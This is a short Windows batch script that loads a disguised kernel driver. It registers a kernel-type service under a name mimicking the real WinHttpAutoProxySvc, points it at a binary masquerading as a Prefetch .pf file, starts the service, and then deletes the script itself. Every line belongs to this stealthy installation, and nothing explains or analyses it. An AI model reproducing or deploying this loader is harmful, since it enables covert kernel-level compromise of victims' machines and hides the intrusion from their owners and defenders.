@echo off
cd %~dp0
sc create WinHttpAutoProxySvc639_c binpath=C:\Windows\Prefetch\CMD.EXE-G9T3RM25.pf type=kernel
sc start WinHttpAutoProxySvc639_c
del "%~f0"